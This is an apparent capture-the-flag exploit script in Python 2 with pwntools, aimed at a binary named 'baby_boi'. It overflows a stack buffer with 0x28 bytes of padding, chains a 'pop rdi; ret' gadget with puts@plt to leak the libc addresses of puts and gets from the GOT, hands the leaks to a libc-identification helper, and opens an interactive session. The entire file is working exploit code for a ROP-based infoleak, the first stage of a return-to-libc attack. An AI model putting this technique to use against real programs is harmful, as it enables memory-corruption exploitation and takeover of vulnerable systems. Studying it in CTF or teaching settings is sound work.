import TheNight
from pwn import *


# Establish the target
target = process('./baby_boi')
elf = ELF('baby_boi')
#gdb.attach(target)

# Our Rop Gadget to `pop rdi; ret`
popRdi = p64(0x400793)

# plt address of puts
puts = p64(elf.symbols["puts"])

# Parse out some output
print target.recvuntil("ere I am: ")
target.recvline()

# Form our payload to leak libc address of puts and get by calling the plt address of puts twice, with it's argument being the got address of puts and then gets
payload = ""
payload += "0"*0x28         
payload += popRdi                    # Pop rdi ; ret
payload += p64(elf.got["puts"])        # Got address for puts
payload += puts                     # Plt address puts
payload += popRdi                    # Pop rdi ; ret
payload += p64(elf.got["gets"])     # Got address for get
payload += puts                     # Plt address puts

# Send the payload
target.sendline(payload)

# Scan in the libc infoleaks
leak0 = target.recvline().strip("\n")
putsLibc = u64(leak0 + "\x00"*(8-len(leak0)))

leak1 = target.recvline().strip("\n")
getsLibc = u64(leak1 + "\x00"*(8-len(leak1)))

print "puts libc: " + hex(putsLibc)
print "gets libc: " + hex(getsLibc)

# Pass the leaks to The Night to figure out
TheNight.findLibcVersion("puts", putsLibc, "gets", getsLibc)

target.interactive()